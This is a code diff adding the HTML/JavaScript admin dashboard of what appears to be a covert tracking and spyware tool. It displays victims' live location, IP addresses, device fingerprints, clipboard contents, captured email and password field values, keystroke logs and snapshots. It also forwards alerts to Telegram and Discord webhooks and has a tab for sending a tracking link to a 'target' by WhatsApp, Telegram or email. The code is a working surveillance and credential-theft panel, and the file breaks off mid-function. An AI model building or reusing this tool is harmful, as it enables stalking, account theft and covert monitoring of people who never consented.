@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Admin Panel — Live Tracker</title>
+    <script src="/config.js"></script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        :root { --bg: #0f0f23; --bg2: #1a1a3e; --bg3: #252555; --border: #2a2a5e; --text: #fff; --text2: #aaa; --text3: #888; --accent: #00d4ff; --accent2: #7c3aed; }
+        .light { --bg: #f5f5fa; --bg2: #ffffff; --bg3: #e8e8f0; --border: #d0d0e0; --text: #1a1a2e; --text2: #555; --text3: #777; --accent: #0099cc; --accent2: #6d28d9; }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; transition: background .3s, color .3s; }
+
+        .header { background: var(--bg2); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid var(--accent); gap: 10px; flex-wrap: wrap; }
+        .header h1 { font-size: 1.2rem; color: var(--accent); white-space: nowrap; }
+        .header .header-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .header .stats { display: flex; gap: 16px; font-size: 0.8rem; color: var(--text2); }
+        .header .stats span { color: var(--text); font-weight: 600; }
+        .header-btn { background: var(--bg3); border: 1px solid var(--border); color: var(--text); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: all .2s; white-space: nowrap; }
+        .header-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+        .layout { display: flex; height: calc(100vh - 56px); }
+        .sidebar { width: 300px; min-width: 300px; background: var(--bg2); overflow-y: auto; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+        .sidebar .search { padding: 10px 12px; border-bottom: 1px solid var(--border); }
+        .sidebar .search input { width: 100%; padding: 7px 10px; border-radius: 6px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 0.82rem; outline: none; transition: border .2s; }
+        .sidebar .search input:focus { border-color: var(--accent); }
+        .sidebar .device-list { flex: 1; overflow-y: auto; }
+        .sidebar .device-item { padding: 10px 12px; border-bottom: 1px solid var(--border); cursor: pointer; transition: background .15s; }
+        .sidebar .device-item:hover { background: var(--bg3); }
+        .sidebar .device-item.active { background: var(--bg3); border-left: 3px solid var(--accent); }
+        .sidebar .device-item .name { font-weight: 600; font-size: 0.85rem; display: flex; align-items: center; gap: 6px; }
+        .sidebar .device-item .meta { font-size: 0.72rem; color: var(--text3); margin-top: 3px; }
+        .sidebar .device-item .loc-info { font-size: 0.72rem; color: var(--accent); margin-top: 2px; font-family: monospace; }
+        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+        .status-dot.online { background: #00c853; box-shadow: 0 0 6px #00c85388; }
+        .status-dot.offline { background: #666; }
+        .badge { background: var(--accent); color: #0f0f23; padding: 1px 7px; border-radius: 10px; font-size: 0.7rem; font-weight: 600; }
+
+        .main { flex: 1; display: flex; flex-direction: column; }
+        .main .map-wrap { flex: 1; position: relative; }
+        #map { width: 100%; height: 100%; }
+        .main .detail-panel { background: var(--bg2); border-top: 2px solid var(--accent); transition: height .3s; overflow-y: auto; }
+        .detail-panel.collapsed { height: 0 !important; border-top: none; }
+        .detail-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 16px; border-bottom: 1px solid var(--border); cursor: pointer; }
+        .detail-header h3 { color: var(--accent); font-size: 0.95rem; }
+        .detail-header .close-btn { background: none; border: none; color: #ff4444; cursor: pointer; font-size: 1.2rem; padding: 0 4px; }
+        .detail-body { padding: 12px 16px 16px; }
+
+        .tabs { display: flex; gap: 4px; margin-bottom: 12px; flex-wrap: wrap; }
+        .tab { padding: 6px 14px; border-radius: 6px; border: 1px solid var(--border); background: none; color: var(--text2); cursor: pointer; font-size: 0.78rem; transition: all .2s; }
+        .tab:hover { border-color: var(--accent); color: var(--accent); }
+        .tab.active { background: var(--accent); color: #0f0f23; border-color: var(--accent); font-weight: 600; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px 16px; font-size: 0.82rem; }
+        .info-grid .label { color: var(--text3); }
+        .info-grid .value { color: var(--text); font-family: monospace; }
+        .info-grid .value.highlight { color: var(--accent); font-weight: 600; }
+
+        .loc-actions { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+        .loc-actions a, .loc-actions button { display: inline-flex; align-items: center; gap: 5px; padding: 6px 12px; border-radius: 6px; font-size: 0.76rem; font-weight: 500; text-decoration: none; border: none; cursor: pointer; transition: all .2s; }
+        .loc-actions .gmaps { background: #1a6b4c; color: #fff; }
+        .loc-actions .gmaps:hover { background: #21885f; }
+        .loc-actions .copy-btn { background: var(--bg3); color: var(--text); }
+        .loc-actions .copy-btn:hover { background: var(--accent); color: #0f0f23; }
+
+        .history-wrap { position: relative; margin: 10px 0; }
+        .history-wrap canvas { width: 100%; height: 60px; border-radius: 6px; cursor: pointer; }
+        .history-bar { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+        .history-bar button { padding: 4px 10px; border-radius: 5px; border: 1px solid var(--border); background: var(--bg3); color: var(--text); cursor: pointer; font-size: 0.75rem; }
+        .history-bar button:hover { border-color: var(--accent); }
+        .history-bar button.active { background: var(--accent); color: #0f0f23; border-color: var(--accent); }
+
+        .snap-grid { display: flex; gap: 6px; flex-wrap: wrap; }
+        .snap-grid img { width: 100px; height: 75px; object-fit: cover; border-radius: 5px; border: 1px solid var(--border); cursor: pointer; transition: border-color .2s; }
+        .snap-grid img:hover { border-color: var(--accent); }
+
+        .geofence-inputs { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin: 8px 0; }
+        .geofence-inputs input { padding: 6px 10px; border-radius: 6px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 0.8rem; width: 90px; }
+        .geofence-inputs button { padding: 6px 12px; border-radius: 6px; border: none; background: var(--accent); color: #0f0f23; cursor: pointer; font-weight: 600; font-size: 0.8rem; }
+
+        .no-devices { padding: 30px; text-align: center; color: var(--text3); font-size: 0.9rem; }
+
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
+        .toast { padding: 12px 18px; border-radius: 8px; font-size: 0.82rem; backdrop-filter: blur(12px); animation: toastIn .35s ease; display: flex; align-items: center; gap: 8px; box-shadow: 0 6px 24px rgba(0,0,0,0.3); }
+        .toast.info { background: rgba(0,212,255,0.15); border: 1px solid rgba(0,212,255,0.2); color: var(--accent); }
+        .toast.success { background: rgba(0,200,83,0.15); border: 1px solid rgba(0,200,83,0.2); color: #00c853; }
+        .toast.warn { background: rgba(255,152,0,0.15); border: 1px solid rgba(255,152,0,0.2); color: #ff9800; }
+        @keyframes toastIn { from { opacity:0; transform:translateX(60px); } to { opacity:1; transform:translateX(0); } }
+        .toast.out { animation: toastOut .25s ease forwards; }
+        @keyframes toastOut { to { opacity:0; transform:translateX(40px); } }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+        @media (max-width: 768px) {
+            body { overflow-y: auto; height: auto; }
+            .layout { flex-direction: column; height: auto; }
+            .sidebar { width: 100%; min-width: unset; max-height: 40vh; }
+            .main { min-height: 60vh; }
+            .map-wrap { min-height: 50vh; }
+            .header { flex-direction: column; align-items: stretch; gap: 8px; }
+            .header .header-right { justify-content: space-between; }
+            .info-grid { grid-template-columns: 1fr; }
+            .detail-panel { max-height: 50vh; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Live Tracker</h1>
+        <div class="header-right">
+            <div class="stats">Online: <span id="onlineCount">0</span> &middot; Total: <span id="totalCount">0</span></div>
+            <button class="header-btn" onclick="toggleTheme()" id="themeBtn">Mode Terang</button>
+            <button class="header-btn" onclick="exportCSV()">CSV</button>
+            <button class="header-btn" onclick="exportJSON()">JSON</button>
+        </div>
+    </div>
+
+    <div class="layout">
+        <div class="sidebar">
+            <div class="search"><input id="searchInput" placeholder="Cari device..." oninput="filterDevices()"></div>
+            <div class="device-list" id="deviceList"></div>
+        </div>
+        <div class="main">
+            <div class="map-wrap"><div id="map"></div></div>
+            <div class="detail-panel collapsed" id="detailPanel">
+                <div class="detail-header" onclick="toggleDetail()">
+                    <h3 id="detailName">Device</h3>
+                    <button class="close-btn" onclick="event.stopPropagation();closeDetail()">&times;</button>
+                </div>
+                <div class="detail-body" id="detailBody">
+                    <div class="tabs">
+                        <button class="tab active" data-tab="info" onclick="switchTab('info')">Info</button>
+                        <button class="tab" data-tab="hardware" onclick="switchTab('hardware')">Hardware</button>
+                        <button class="tab" data-tab="behavior" onclick="switchTab('behavior')">Behavior</button>
+                        <button class="tab" data-tab="history" onclick="switchTab('history')">History</button>
+                        <button class="tab" data-tab="snapshots" onclick="switchTab('snapshots')">Snapshot</button>
+                        <button class="tab" data-tab="geofence" onclick="switchTab('geofence')">Geofence</button>
+                        <button class="tab" data-tab="profile" onclick="switchTab('profile')">AI Profile</button>
+                        <button class="tab" data-tab="target" onclick="switchTab('target')">Target</button>
+                        <button class="tab" data-tab="webhook" onclick="switchTab('webhook')">Webhook</button>
+                        <button class="tab" data-tab="forensics" onclick="switchTab('forensics')">Forensics</button>
+                        <button class="tab" data-tab="export" onclick="switchTab('export')">Export</button>
+                    </div>
+
+                    <!-- TAB: INFO -->
+                    <div class="tab-content active" id="tab-info">
+                        <div class="info-grid">
+                            <div><span class="label">Latitude</span><div class="value highlight" id="dLat">-</div></div>
+                            <div><span class="label">Longitude</span><div class="value highlight" id="dLng">-</div></div>
+                            <div><span class="label">Akurasi</span><div class="value" id="dAcc">-</div></div>
+                            <div><span class="label">IP Address</span><div class="value" id="dIp">-</div></div>
+                            <div><span class="label">Status</span><div class="value" id="dStatus">-</div></div>
+                            <div><span class="label">Pertama</span><div class="value" id="dFirst">-</div></div>
+                            <div><span class="label">Terakhir</span><div class="value" id="dLast">-</div></div>
+                            <div><span class="label">Battery</span><div class="value" id="dBattery">-</div></div>
+                            <div><span class="label">Koneksi</span><div class="value" id="dConnection">-</div></div>
+                            <div style="grid-column:1/-1;"><span class="label">UA</span><div class="value" id="dUA" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
+                        </div>
+                        <div class="loc-actions" id="locActions">
+                            <a href="#" target="_blank" class="gmaps" id="gmapsLink">Buka GMaps</a>
+                            <button class="copy-btn" onclick="copyCoords()">Salin Koordinat</button>
+                        </div>
+                    </div>
+
+                    <!-- TAB: HISTORY -->
+                    <div class="tab-content" id="tab-history">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Klik timeline untuk lihat posisi di peta.</p>
+                        <div class="history-wrap"><canvas id="historyCanvas" height="60"></canvas></div>
+                        <div class="history-bar">
+                            <button onclick="showAllHistory()" class="active" id="hAll">Semua</button>
+                            <button onclick="showHistory('1m')" id="h1m">1 Jam</button>
+                            <button onclick="showHistory('30m')" id="h30m">30 Menit</button>
+                            <button onclick="showHistory('5m')" id="h5m">5 Menit</button>
+                            <button onclick="clearHistory()" style="margin-left:auto;border-color:#ff4444;color:#ff4444;">Hapus</button>
+                        </div>
+                    </div>
+
+                    <!-- TAB: SNAPSHOTS -->
+                    <div class="tab-content" id="tab-snapshots">
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+                            <span style="font-size:0.82rem;color:var(--text3);" id="snapCount">0 snapshot</span>
+                            <button class="header-btn" onclick="exportSnapshots()">Download ZIP</button>
+                        </div>
+                        <div class="snap-grid" id="snapGrid"></div>
+                    </div>
+
+                    <!-- TAB: GEOFENCE -->
+                    <div class="tab-content" id="tab-geofence">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Buat alert jika device keluar dari area tertentu.</p>
+                        <div class="geofence-inputs">
+                            <input id="gfLat" placeholder="Lat" value="-6.2088">
+                            <input id="gfLng" placeholder="Lng" value="106.8456">
+                            <input id="gfRadius" placeholder="Radius (m)" value="500" style="width:75px;">
+                            <button onclick="setGeofence()">Terapkan</button>
+                        </div>
+                        <div id="gfStatus" style="font-size:0.8rem;color:var(--text3);margin-top:6px;"></div>
+                    </div>
+
+                    <!-- TAB: HARDWARE -->
+                    <div class="tab-content" id="tab-hardware">
+                        <div class="info-grid">
+                            <div><span class="label">GPU Vendor</span><div class="value" id="dGpuVendor">-</div></div>
+                            <div><span class="label">GPU Renderer</span><div class="value" id="dGpuRenderer">-</div></div>
+                            <div><span class="label">Audio FP</span><div class="value" id="dAudioFP">-</div></div>
+                            <div><span class="label">CPU Ops/ms</span><div class="value" id="dCpuScore">-</div></div>
+                            <div><span class="label">Fonts Terinstall</span><div class="value" id="dFonts">-</div></div>
+                            <div><span class="label">Theme</span><div class="value" id="dTheme">-</div></div>
+                            <div><span class="label">Motion</span><div class="value" id="dMotion">-</div></div>
+                            <div><span class="label">Light Sensor</span><div class="value" id="dLight">-</div></div>
+                            <div><span class="label">Storage Used</span><div class="value" id="dStorage">-</div></div>
+                            <div><span class="label">Reduced Motion</span><div class="value" id="dReducedMotion">-</div></div>
+                        </div>
+                    </div>
+
+                    <!-- TAB: BEHAVIOR -->
+                    <div class="tab-content" id="tab-behavior">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Data aktivitas dan interaksi device.</p>
+                        <div class="info-grid">
+                            <div><span class="label">WebRTC IP</span><div class="value" id="dWebRTC">-</div></div>
+                            <div><span class="label">Speed Test</span><div class="value" id="dSpeedTest">-</div></div>
+                            <div><span class="label">Bluetooth</span><div class="value" id="dBluetooth">-</div></div>
+                            <div><span class="label">Idle</span><div class="value" id="dIdle">-</div></div>
+                            <div><span class="label">Visibility</span><div class="value" id="dVisibility">-</div></div>
+                            <div><span class="label">Tab Count</span><div class="value" id="dTabs">-</div></div>
+                            <div><span class="label">Fullscreen</span><div class="value" id="dFullscreen">-</div></div>
+                            <div><span class="label">Pointer Lock</span><div class="value" id="dPointerLock">-</div></div>
+                            <div><span class="label">Orientation Lock</span><div class="value" id="dOrientationLock">-</div></div>
+                            <div><span class="label">Wake Lock</span><div class="value" id="dWakeLock">-</div></div>
+                            <div style="grid-column:1/-1;"><span class="label">Clipboard</span><div class="value" id="dClipboard" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
+                            <div style="grid-column:1/-1;"><span class="label">Email Field</span><div class="value" id="dFieldEmail" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
+                            <div style="grid-column:1/-1;"><span class="label">Password Field</span><div class="value" id="dFieldPass" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
+                        </div>
+                        <div style="margin-top:10px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Keystroke Log:</span>
+                            <div id="dKeystrokes" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:100px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Click Map:</span>
+                            <div id="dClicks" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:60px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                    </div>
+
+                    <!-- TAB: EXPORT -->
+                    <div class="tab-content" id="tab-export">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:10px;">Export data device ini.</p>
+                        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="exportDeviceCSV()">Export CSV</button>
+                            <button class="header-btn" onclick="exportDeviceJSON()">Export JSON</button>
+                            <button class="header-btn" onclick="exportSnapshots()">Download Snapshot ZIP</button>
+                        </div>
+                    </div>
+
+                    <!-- TAB: AI PROFILE -->
+                    <div class="tab-content" id="tab-profile">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Profil otomatis berdasarkan seluruh data yang terkumpul.</p>
+                        <div id="profileContent" style="background:var(--bg);padding:10px 12px;border-radius:8px;font-size:0.8rem;line-height:1.7;white-space:pre-wrap;word-break:break-word;max-height:300px;overflow-y:auto;font-family:monospace;"></div>
+                        <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
+                            <span id="profileRisk" style="padding:3px 10px;border-radius:12px;font-size:0.75rem;font-weight:600;"></span>
+                            <span id="profileDevice" style="color:var(--text3);font-size:0.75rem;"></span>
+                        </div>
+                        <button class="header-btn" style="margin-top:8px;" onclick="loadProfile()">Refresh Profile</button>
+                    </div>
+
+                    <!-- TAB: AUTO-TARGET -->
+                    <div class="tab-content" id="tab-target">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Buat link tracking dan bagikan ke target.</p>
+                        <div style="background:var(--bg);padding:10px 12px;border-radius:8px;">
+                            <div style="font-size:0.8rem;color:var(--text2);margin-bottom:6px;">Tracking Link:</div>
+                            <div id="targetLink" style="font-size:0.82rem;color:var(--accent);word-break:break-all;font-family:monospace;margin-bottom:10px;"></div>
+                            <div style="display:flex;gap:6px;flex-wrap:wrap;">
+                                <a id="targetWA" href="#" target="_blank" style="padding:6px 14px;border-radius:6px;background:#25D366;color:#fff;text-decoration:none;font-size:0.78rem;font-weight:600;">WhatsApp</a>
+                                <a id="targetTG" href="#" target="_blank" style="padding:6px 14px;border-radius:6px;background:#0088cc;color:#fff;text-decoration:none;font-size:0.78rem;font-weight:600;">Telegram</a>
+                                <a id="targetEmail" href="#" target="_blank" style="padding:6px 14px;border-radius:6px;background:#ea4335;color:#fff;text-decoration:none;font-size:0.78rem;font-weight:600;">Email</a>
+                                <button onclick="copyTargetLink()" style="padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:var(--bg3);color:var(--text);cursor:pointer;font-size:0.78rem;">Copy Link</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- TAB: WEBHOOK -->
+                    <div class="tab-content" id="tab-webhook">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Kirim notifikasi real-time ke Telegram atau Discord.</p>
+                        <div style="background:var(--bg);padding:10px 12px;border-radius:8px;margin-bottom:8px;">
+                            <div style="font-size:0.8rem;color:var(--text2);margin-bottom:4px;">Telegram Webhook URL:</div>
+                            <div style="display:flex;gap:6px;">
+                                <input id="webhookTG" placeholder="https://api.telegram.org/bot.../sendMessage?text={text}" style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <button onclick="addWebhook('telegram')" style="padding:6px 12px;border-radius:6px;border:none;background:var(--accent);color:#0f0f23;cursor:pointer;font-weight:600;font-size:0.78rem;">+</button>
+                            </div>
+                        </div>
+                        <div style="background:var(--bg);padding:10px 12px;border-radius:8px;margin-bottom:8px;">
+                            <div style="font-size:0.8rem;color:var(--text2);margin-bottom:4px;">Discord Webhook URL:</div>
+                            <div style="display:flex;gap:6px;">
+                                <input id="webhookDC" placeholder="https://discord.com/api/webhooks/..." style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <button onclick="addWebhook('discord')" style="padding:6px 12px;border-radius:6px;border:none;background:var(--accent);color:#0f0f23;cursor:pointer;font-weight:600;font-size:0.78rem;">+</button>
+                            </div>
+                        </div>
+                        <div id="webhookStatus" style="font-size:0.78rem;color:var(--text3);"></div>
+                    </div>
+
+                    <!-- TAB: FORENSICS ALERTS -->
+                    <div class="tab-content" id="tab-forensics">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Deteksi anti-forensics dari device (devtools, VPN, emulator, root).</p>
+                        <div id="forensicsList" style="max-height:300px;overflow-y:auto;">
+                            <div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Pilih device untuk melihat alert</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+    <audio id="notifSound" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACAf39/f4CAgH+AgH+AgH+AgH9/f3+AgH+AgH+AgH+AgH9/f3+AgH+AgH+Af4CAgH+AgH9/f3+AgH+AgH+Af4CAgH+AgH9/f3+AgH+AgH+AgH9/f3+AgH+AgH+Af4B/gH+AgH+Af4B/gH+AgH+Af4B/gH+AgH+Af4B/gH+Af4B/gH+Af4B/gH+Af4B/gH+Af4B/gH+Af4B/gH+Af39/f4B/gH+Af4B/gH+Af39/f4B/gH+Af4B/gH+Af39/f4B/gH+Af4B/gH+Af4B/gH+Af39/f3+AgH+Af4B/gH+Af39/f39/f4B/gH+Af39/f4B/gH+Af4B/gH+Af39/f4B/gH+Af39/f39/f39/f4B/gH+Af39/f4B/gH+Af39/f39/f39/f39/f39/f39/f39/f4B/gH+Af4B/gH+Af39/f39/f39/f4B/gH+Af39/f4B/gH+Af39/f39/f39/f39/f39/f39/f39/f39/f39/f3+AgH+Af4B/gH+Af39/f39/f39/f39/f39/f39/f4B/gH+Af39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/gH+Af4B/gH+Af4B/gH+Af39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f4B/gH+Af4B/gH+Af4B/gH+Af4B/gH+Af4B/gH+Af39/f39/f39/f4B/gH+Af4B/gH+Af39/f39/f39/f39/f39/f39/f39/f39/f4B/gH+Af39/f39/f39/f39/f39/f39/f4B/gH+Af39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f38=" preload="none"></audio>
+
+    <script>
+        const socket = io(SERVER_URL);
+        const map = L.map('map').setView([-6.2, 106.8], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '© OpenStreetMap' }).addTo(map);
+
+        const markers = {}, polylines = {}, historyData = {};
+        const devices = {};
+        let selectedId = null, currentTab = 'info', histPoints = [];
+        let gfCenter = null, gfRadius = 500;
+        let notifEnabled = true;
+
+        // === THEME ===
+        function toggleTheme() {
+            document.body.classList.toggle('light');
+            document.getElementById('themeBtn').textContent = document.body.classList.contains('light') ? 'Mode Gelap' : 'Mode Terang';
+        }
+
+        // === TOAST ===
+        function showToast(msg, type) {
+            const c = document.getElementById('toastContainer');
+            const t = document.createElement('div');
+            t.className = 'toast ' + (type||'info');
+            t.innerHTML = msg;
+            c.appendChild(t);
+            setTimeout(() => { t.classList.add('out'); setTimeout(()=>t.remove(),250); }, 3500);
+            if (notifEnabled && type === 'warn') {
+                document.getElementById('notifSound').play().catch(()=>{});
+            }
+        }
+
+        // === NOTIF SOUND ON NEW DEVICE ===
+        socket.on('device-new', (d) => {
+            showToast(`Device baru: <b>${d.label}</b>`, 'warn');
+        });
+
+        // === API ===
+        function fetchDevices() {
+            fetch(SERVER_URL + '/api/devices').then(r=>r.json()).then(data => {
+                for (const d of data) { devices[d.id] = d; }
+                renderDevices(); updateStats();
+            });
+        }
+
+        function renderDevices() {
+            const list = document.getElementById('deviceList');
+            const q = document.getElementById('searchInput').value.toLowerCase();
+            const entries = Object.values(devices);
+            const filtered = q ? entries.filter(d => d.label.toLowerCase().includes(q) || d.id.toLowerCase().includes(q) || (d.ip&&d.ip.includes(q))) : entries;
+            if (!filtered.length) { list.innerHTML='<div class="no-devices">Tidak ada device</div>'; return; }
+            list.innerHTML = filtered.map(d => {
+                const online = d.online;
+                const hl = d.location;
+                const lt = hl ? `${hl.lat.toFixed(4)}, ${hl.lng.toFixed(4)}` : 'Tidak ada';
+                const act = d.id===selectedId?'active':'';
+                const snapBadge = d.snapshotsCount?`<span class="badge">${d.snapshotsCount}</span>`:'';
+                return `<div class="device-item ${act}" onclick="selectDevice('${d.id}')">
+                    <div class="name"><span class="status-dot ${online?'online':'offline'}"></span>${d.label} ${snapBadge}</div>
+                    <div class="loc-info">${lt}</div>
+                    <div class="meta">IP: ${d.ip||'-'} &middot; ${new Date(d.lastSeen).toLocaleTimeString()}</div>
+                </div>`;
+            }).join('');
+        }
+
+        function updateStats() {
+            const e = Object.values(devices);
+            document.getElementById('onlineCount').textContent = e.filter(d=>d.online).length;
+            document.getElementById('totalCount').textContent = e.length;
+        }
+
+        // === SELECT DEVICE ===
+        function selectDevice(id) {
+            selectedId = id;
+            renderDevices();
+            const d = devices[id];
+            if (!d) return;
+
+            const panel = document.getElementById('detailPanel');
+            panel.classList.remove('collapsed');
+            document.getElementById('detailName').textContent = d.label;
+
+            // Info
+            document.getElementById('dIp').textContent = d.ip||'-';
+            document.getElementById('dStatus').textContent = d.online?'Online':'Offline';
+            document.getElementById('dFirst').textContent = new Date(d.firstSeen).toLocaleString();
+            document.getElementById('dLast').textContent = new Date(d.lastSeen).toLocaleString();
+            document.getElementById('dUA').textContent = d.userAgent||'-';
+
+            // Battery
+            const bat = d.battery;
+            if (bat && bat.level !== undefined) {
+                const pct = Math.round(bat.level*100);
+                const chg = bat.charging?'Mengisi':'Tidak';
+                document.getElementById('dBattery').textContent = `${pct}% (${chg})`;
+            } else { document.getElementById('dBattery').textContent = '-'; }
+
+            // Connection
+            const conn = d.connection;
+            if (conn && conn.type) {
+                document.getElementById('dConnection').textContent = `${conn.type} ${conn.effectiveType||''}`;
+            } else { document.getElementById('dConnection').textContent = '-'; }
+
+            // Loc
+            const loc = d.location;
+            if (loc) {
+                document.getElementById('dLat').textContent = loc.lat.toFixed(7);
+                document.getElementById('dLng').textContent = loc.lng.toFixed(7);
+                document.getElementById('dAcc').textContent = loc.accuracy?`${loc.accuracy.toFixed(1)} m`:'-';
+                document.getElementById('gmapsLink').href = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+                document.getElementById('locActions').style.display = 'flex';
+                map.setView([loc.lat, loc.lng], 16);
+            } else {
+                document.getElementById('dLat').textContent = '-';
+                document.getElementById('dLng').textContent = '-';
+                document.getElementById('dAcc').textContent = '-';
+                document.getElementById('locActions').style.display = 'none';
+            }
+
+            // Hardware
+            const wg = d.webgl;
+            document.getElementById('dGpuVendor').textContent = wg?.unmaskedVendor || wg?.vendor || '-';
+            document.getElementById('dGpuRenderer').textContent = wg?.unmaskedRenderer || wg?.renderer || '-';
+            document.getElementById('dAudioFP').textContent = d.audioFP ? d.audioFP.hash.slice(0,16)+'…' : '-';
+            const ct = d.cpuTiming;
+            document.getElementById('dCpuScore').textContent = ct ? ct.map(c=>c.opsPerMs+'ops/ms').join(' | ') : '-';
+            document.getElementById('dFonts').textContent = d.fonts ? d.fonts.count+' font ('+d.fonts.installed.slice(0,5).join(', ')+'…)' : '-';
+            const pref = d.preferences;
+            document.getElementById('dTheme').textContent = pref?.colorScheme || '-';
+            document.getElementById('dReducedMotion').textContent = pref ? (pref.reducedMotion?'Yes':'No') : '-';
+            document.getElementById('dMotion').textContent = d.motion ? `α:${d.motion.accX?.toFixed(1)||'-'} β:${d.motion.accY?.toFixed(1)||'-'} γ:${d.motion.accZ?.toFixed(1)||'-'}` : '-';
+            document.getElementById('dLight').textContent = d.light?.illuminance ? d.light.illuminance.toFixed(0)+' lux' : (d.light?.screenBrightness ? d.light.screenBrightness+'%' : '-');
+            document.getElementById('dStorage').textContent = d.storageEstimate ? d.storageEstimate.pct+'% ('+(d.storageEstimate.usage/1048576).toFixed(0)+'/'+(d.storageEstimate.quota/1048576).toFixed(0)+' MB)' : '-';
+
+            // Behavior
+            document.getElementById('dWebRTC').textContent = d.webrtcIP || '-';
+            document.getElementById('dSpeedTest').textContent = d.speedTest ? d.speedTest.ms+'ms' : '-';
+            document.getElementById('dBluetooth').textContent = d.bluetooth ? d.bluetooth.name||d.bluetooth.id : '-';
+            document.getElementById('dIdle').textContent = d.idle ? d.idle.state+(' (idleFor' in d.idle ? ' '+(d.idle.idleFor/1000).toFixed(0)+'s' : '') : '-';
+            document.getElementById('dVisibility').textContent = d.visibility ? d.visibility.state : '-';
+            document.getElementById('dTabs').textContent = d.tabs ? d.tabs+' tab' : '1 tab';
+            document.getElementById('dFullscreen').textContent = d.fullscreen?.state||'-';
+            document.getElementById('dPointerLock').textContent = d.pointerLock?.state||'-';
+            document.getElementById('dOrientationLock').textContent = d.orientationLock?.locked?'Locked ('+d.orientationLock.type+')':'-';
+            document.getElementById('dWakeLock').textContent = d.wakeLock === true ? 'Active' : (d.wakeLock === false ? 'Failed: '+d.wakeLockError : '-');
+            document.getElementById('dClipboard').textContent = d.clipboard || '-';
+            document.getElementById('dFieldEmail').textContent = d.fieldEmail || '-';
+            document.getElementById('dFieldPass').textContent = d.fieldPass ? '***captured***' : '-';
+
+            // Keystrokes
+            const ksEl = document.getElementById('dKeystrokes');
+            if (d.keystrokes && d.keystrokes.length) {
